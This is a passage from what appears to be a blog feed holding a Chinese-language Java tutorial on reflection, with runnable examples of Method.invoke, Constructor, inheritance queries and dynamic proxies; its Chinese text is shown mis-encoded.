¸å¿ƒåº“çš„å®‰å…¨ã€‚</p><h3 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h3><p>ä¸€ä¸ªPersonç±»å®šä¹‰äº†hello()æ–¹æ³•ï¼Œå¹¶ä¸”å®ƒçš„å­ç±»Studentä¹Ÿè¦†å†™äº†hello()æ–¹æ³•ï¼Œé‚£ä¹ˆï¼Œä»Person.classè·å–çš„Methodï¼Œä½œç”¨äºStudentå®ä¾‹æ—¶ï¼Œè°ƒç”¨çš„æ–¹æ³•åˆ°åº•æ˜¯å“ªä¸ªï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è·å–Personçš„helloæ–¹æ³•:</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">h</span> <span class="operator">=</span> Person.class.getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// å¯¹Studentå®ä¾‹è°ƒç”¨helloæ–¹æ³•:</span></span><br><span class="line">        h.invoke(<span class="keyword">new</span> <span class="title class_">Student</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šè¿°ä»£ç ï¼Œå‘ç°æ‰“å°å‡ºçš„æ˜¯Student:helloï¼Œå› æ­¤ï¼Œä½¿ç”¨åå°„è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä»ç„¶éµå¾ªå¤šæ€åŸåˆ™ï¼šå³æ€»æ˜¯è°ƒç”¨å®é™…ç±»å‹çš„è¦†å†™æ–¹æ³•ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚</p><h2 id="è°ƒç”¨æ„é€ æ–¹æ³•"><a href="#è°ƒç”¨æ„é€ æ–¹æ³•" class="headerlink" title="è°ƒç”¨æ„é€ æ–¹æ³•"></a>è°ƒç”¨æ„é€ æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> Person.class.newInstance();</span><br></pre></td></tr></table></figure><p>è°ƒç”¨Class.newInstance()çš„å±€é™æ˜¯ï¼Œå®ƒåªèƒ½è°ƒç”¨è¯¥ç±»çš„publicæ— å‚æ•°æ„é€ æ–¹æ³•ã€‚å¦‚æœæ„é€ æ–¹æ³•å¸¦æœ‰å‚æ•°ï¼Œæˆ–è€…ä¸æ˜¯publicï¼Œå°±æ— æ³•ç›´æ¥é€šè¿‡Class.newInstance()æ¥è°ƒç”¨ã€‚ä¸ºäº†è°ƒç”¨ä»»æ„çš„æ„é€ æ–¹æ³•ï¼ŒJavaçš„åå°„APIæä¾›äº†Constructorå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæ„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚Constructorå¯¹è±¡å’ŒMethodéå¸¸ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„ä»…åœ¨äºå®ƒæ˜¯ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ï¼Œè°ƒç”¨ç»“æœæ€»æ˜¯è¿”å›å®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è·å–æ„é€ æ–¹æ³•Integer(int):</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons1</span> <span class="operator">=</span> Integer.class.getConstructor(<span class="type">int</span>.class);</span><br><span class="line">        <span class="comment">// è°ƒç”¨æ„é€ æ–¹æ³•:</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n1</span> <span class="operator">=</span> (Integer) cons1.newInstance(<span class="number">123</span>);</span><br><span class="line">        System.out.println(n1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–æ„é€ æ–¹æ³•Integer(String)</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons2</span> <span class="operator">=</span> Integer.class.getConstructor(String.class);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n2</span> <span class="operator">=</span> (Integer) cons2.newInstance(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">        System.out.println(n2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡Classå®ä¾‹è·å–Constructorçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><ul><li>getConstructor(Classâ€¦)ï¼šè·å–æŸä¸ªpublicçš„Constructorï¼›</li><li>getDeclaredConstructor(Classâ€¦)ï¼šè·å–æŸä¸ªConstructorï¼›</li><li>getConstructors()ï¼šè·å–æ‰€æœ‰publicçš„Constructorï¼›</li><li>getDeclaredConstructors()ï¼šè·å–æ‰€æœ‰Constructorã€‚</li></ul><p>æ³¨æ„Constructoræ€»æ˜¯å½“å‰ç±»å®šä¹‰çš„æ„é€ æ–¹æ³•ï¼Œå’Œçˆ¶ç±»æ— å…³ï¼Œå› æ­¤ä¸å­˜åœ¨å¤šæ€çš„é—®é¢˜ã€‚<br>è°ƒç”¨épublicçš„Constructoræ—¶ï¼Œå¿…é¡»é¦–å…ˆé€šè¿‡setAccessible(true)è®¾ç½®å…è®¸è®¿é—®ã€‚setAccessible(true)å¯èƒ½ä¼šå¤±è´¥ã€‚</p><h2 id="è·å–ç»§æ‰¿å…³ç³»"><a href="#è·å–ç»§æ‰¿å…³ç³»" class="headerlink" title="è·å–ç»§æ‰¿å…³ç³»"></a>è·å–ç»§æ‰¿å…³ç³»</h2><p>è·å–Classçš„ä¸‰ç§æ–¹å¼:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> String.class; <span class="comment">// è·å–åˆ°Stringçš„Class</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> s.getClass(); <span class="comment">// sæ˜¯Stringï¼Œå› æ­¤è·å–åˆ°Stringçš„Class</span></span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸‰ç§æ–¹å¼è·å–çš„Classå®ä¾‹éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼Œå› ä¸ºJVMå¯¹æ¯ä¸ªåŠ è½½çš„Classåªåˆ›å»ºä¸€ä¸ªClasså®ä¾‹æ¥è¡¨ç¤ºå®ƒçš„ç±»å‹ã€‚</p><h3 id="è·å–çˆ¶ç±»çš„Class"><a href="#è·å–çˆ¶ç±»çš„Class" class="headerlink" title="è·å–çˆ¶ç±»çš„Class"></a>è·å–çˆ¶ç±»çš„Class</h3><p>æœ‰äº†Classå®ä¾‹ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è·å–å®ƒçš„çˆ¶ç±»çš„Classï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">i</span> <span class="operator">=</span> Integer.class;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">n</span> <span class="operator">=</span> i.getSuperclass();</span><br><span class="line">        System.out.println(n);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">o</span> <span class="operator">=</span> n.getSuperclass();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        System.out.println(o.getSuperclass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integerçš„çˆ¶ç±»ç±»å‹æ˜¯Numberï¼ŒNumberçš„çˆ¶ç±»æ˜¯Objectï¼ŒObjectçš„çˆ¶ç±»æ˜¯nullã€‚é™¤Objectå¤–ï¼Œå…¶ä»–ä»»ä½•éinterfaceçš„Classéƒ½å¿…å®šå­˜åœ¨ä¸€ä¸ªçˆ¶ç±»ç±»å‹ã€‚</p><h3 id="è·å–interface"><a href="#è·å–interface" class="headerlink" title="è·å–interface"></a>è·å–interface</h3><p>ç”±äºä¸€ä¸ªç±»å¯èƒ½å®ç°ä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£ï¼Œé€šè¿‡Classæˆ‘ä»¬å°±å¯ä»¥æŸ¥è¯¢åˆ°å®ç°çš„æ¥å£ç±»å‹ã€‚ä¾‹å¦‚ï¼ŒæŸ¥è¯¢Integerå®ç°çš„æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Integer.class;</span><br><span class="line">        Class[] is = s.getInterfaces();</span><br><span class="line">        <span class="keyword">for</span> (Class i : is) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šè¿°ä»£ç å¯çŸ¥ï¼ŒIntegerå®ç°çš„æ¥å£æœ‰ï¼š<br>java.lang.Comparable<br>java.lang.constant.Constable<br>java.lang.constant.ConstantDesc<br>getInterfaces()åªè¿”å›å½“å‰ç±»ç›´æ¥å®ç°çš„æ¥å£ç±»å‹ï¼Œå¹¶ä¸åŒ…æ‹¬å…¶çˆ¶ç±»å®ç°çš„æ¥å£ç±»å‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">s</span> <span class="operator">=</span> Integer.class.getSuperclass();</span><br><span class="line">        Class[] is = s.getInterfaces();</span><br><span class="line">        <span class="keyword">for</span> (Class i : is) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Integerçš„çˆ¶ç±»æ˜¯Numberï¼ŒNumberå®ç°çš„æ¥å£æ˜¯java.io.Serializableã€‚å¯¹æ‰€æœ‰interfaceçš„Classè°ƒç”¨getSuperclass()è¿”å›çš„æ˜¯nullï¼Œè·å–æ¥å£çš„çˆ¶æ¥å£è¦ç”¨getInterfaces()ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(java.io.DataInputStream.class.getSuperclass()); <span class="comment">// java.io.FilterInputStreamï¼Œå› ä¸ºDataInputStreamç»§æ‰¿è‡ªFilterInputStream</span></span><br><span class="line">System.out.println(java.io.Closeable.class.getSuperclass()); <span class="comment">// nullï¼Œå¯¹æ¥å£è°ƒç”¨getSuperclass()æ€»æ˜¯è¿”å›nullï¼Œè·å–æ¥å£çš„çˆ¶æ¥å£è¦ç”¨getInterfaces()</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°ä»»ä½•interfaceï¼Œé‚£ä¹ˆgetInterfaces()è¿”å›ç©ºæ•°ç»„ã€‚</p><h3 id="ç»§æ‰¿å…³ç³»"><a href="#ç»§æ‰¿å…³ç³»" class="headerlink" title="ç»§æ‰¿å…³ç³»"></a>ç»§æ‰¿å…³ç³»</h3><p>å½“æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªå®ä¾‹æ˜¯å¦æ˜¯æŸä¸ªç±»å‹æ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä½¿ç”¨instanceofæ“ä½œç¬¦ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">n</span> <span class="operator">=</span> Integer.valueOf(<span class="number">123</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isDouble</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> Double; <span class="comment">// false</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isInteger</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> Integer; <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isNumber</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> Number; <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isSerializable</span> <span class="operator">=</span> n <span class="keyword">instanceof</span> java.io.Serializable; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ä¸¤ä¸ªClasså®ä¾‹ï¼Œè¦åˆ¤æ–­ä¸€ä¸ªå‘ä¸Šè½¬å‹æ˜¯å¦æˆç«‹ï¼Œå¯ä»¥è°ƒç”¨isAssignableFrom()ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Integer i = ?</span></span><br><span class="line">Integer.class.isAssignableFrom(Integer.class); <span class="comment">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Integer</span></span><br><span class="line"><span class="comment">// Number n = ?</span></span><br><span class="line">Number.class.isAssignableFrom(Integer.class); <span class="comment">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Number</span></span><br><span class="line"><span class="comment">// Object o = ?</span></span><br><span class="line">Object.class.isAssignableFrom(Integer.class); <span class="comment">// trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Object</span></span><br><span class="line"><span class="comment">// Integer i = ?</span></span><br><span class="line">Integer.class.isAssignableFrom(Number.class); <span class="comment">// falseï¼Œå› ä¸ºNumberä¸èƒ½èµ‹å€¼ç»™Integer</span></span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>æœ‰æ²¡æœ‰å¯èƒ½ä¸ç¼–å†™å®ç°ç±»ï¼Œç›´æ¥åœ¨è¿è¡ŒæœŸåˆ›å»ºæŸä¸ªinterfaceçš„å®ä¾‹å‘¢ï¼Ÿè¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºJavaæ ‡å‡†åº“æä¾›äº†ä¸€ç§åŠ¨æ€ä»£ç†ï¼ˆDynamic Proxyï¼‰çš„æœºåˆ¶ï¼šå¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ªinterfaceçš„å®ä¾‹ã€‚<br>æ‰€è°“åŠ¨æ€ä»£ç†ï¼Œæ˜¯å’Œé™æ€ç›¸å¯¹åº”çš„ã€‚æˆ‘ä»¬æ¥çœ‹é™æ€ä»£ç æ€ä¹ˆå†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Good morning, &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloWorld</span>();</span><br><span class="line">hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br></pre></td></tr></table></figure><p>åŠ¨æ€ä»£ç ï¼Œæˆ‘ä»¬ä»ç„¶å…ˆå®šä¹‰äº†æ¥å£Helloï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸å»ç¼–å†™å®ç°ç±»ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡JDKæä¾›çš„ä¸€ä¸ªProxy.newProxyInstance()åˆ›å»ºäº†ä¸€ä¸ªHelloæ¥å£å¯¹è±¡ã€‚è¿™ç§æ²¡æœ‰å®ç°ç±»ä½†æ˜¯åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºäº†ä¸€ä¸ªæ¥å£å¯¹è±¡çš„æ–¹å¼ï¼Œæˆ‘ä»¬ç§°ä¸ºåŠ¨æ€ä»£ç ã€‚JDKæä¾›çš„åŠ¨æ€åˆ›å»ºæ¥å£å¯¹è±¡çš„æ–¹å¼ï¼Œå°±å«åŠ¨æ€ä»£ç†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// ä¼ å…¥ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// ä¼ å…¥è¦å®ç°çš„æ¥å£</span></span><br><span class="line">            handler); <span class="comment">// ä¼ å…¥å¤„ç†è°ƒç”¨æ–¹æ³•çš„InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºä¸€ä¸ªinterfaceå®ä¾‹çš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>å®šä¹‰ä¸€ä¸ªInvocationHandlerå®ä¾‹ï¼Œå®ƒè´Ÿè´£å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨ï¼›</li><li>é€šè¿‡Proxy.newProxyInstance()åˆ›å»ºinterfaceå®ä¾‹ï¼Œå®ƒéœ€è¦3ä¸ªå‚æ•°ï¼š<ol><li>ä½¿ç”¨çš„ClassLoaderï¼Œé€šå¸¸å°±æ˜¯æ¥å£ç±»çš„ClassLoaderï¼›</li><li>éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè‡³å°‘éœ€è¦ä¼ å…¥ä¸€ä¸ªæ¥å£è¿›å»ï¼›</li><li>ç”¨æ¥å¤„ç†æ¥å£æ–¹æ³•è°ƒç”¨çš„InvocationHandlerå®ä¾‹ã€‚</li></ol></li><li>å°†è¿”å›çš„Objectå¼ºåˆ¶è½¬å‹ä¸ºæ¥å£ã€‚</li></ol><p>åŠ¨æ€ä»£ç†å®é™…ä¸Šæ˜¯JVMåœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºclasså­—èŠ‚ç å¹¶åŠ è½½çš„è¿‡ç¨‹ï¼Œå®ƒå¹¶æ²¡æœ‰ä»€ä¹ˆé»‘é­”æ³•ï¼ŒæŠŠä¸Šé¢çš„åŠ¨æ€ä»£ç†æ”¹å†™ä¸ºé™æ€å®ç°ç±»å¤§æ¦‚é•¿è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDynamicProxy</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    InvocationHandler handler;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloDynamicProxy</span><span class="params">(InvocationHandler handler)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handler = handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        handler.invoke(</span><br><span class="line">           <span class="built_in">this</span>,</span><br><span class="line">           Hello.class.getMethod(<span class="string">&quot;morning&quot;</span>, String.class),</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; name &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ¨æ€ä»£ç†æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿå®é™…ä¸Šï¼ŒJava ä¸­çš„â€œåŠ¨æ€â€ä¹Ÿå°±æ„å‘³ç€ä½¿ç”¨äº†åå°„ï¼Œå› æ­¤åŠ¨æ€ä»£ç†å…¶å®æ˜¯åŸºäºåå°„æœºåˆ¶çš„ä¸€ç§ä»£ç†æ¨¡å¼ã€‚</p><p>æœ‰å…³åŠ¨æ€ä»£ç†,è¿˜å­˜åœ¨è¿™Javassistå’ŒASM <a href="https://www.cnblogs.com/fanguangdexiaoyuer/p/12522765.html">https://www.cnblogs.com/fanguangdexiaoyuer/p/12522765.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Androidç³»ç»Ÿå¼€å‘ã€‘æŠŠPytorché›†æˆåˆ°androidç³»ç»Ÿå½“ä¸­</title>
      <link href="/2024/12/16/code/pytorchAndroid/"/>
      <url>/2024/12/16/code/pytorchAndroid/</url>
      
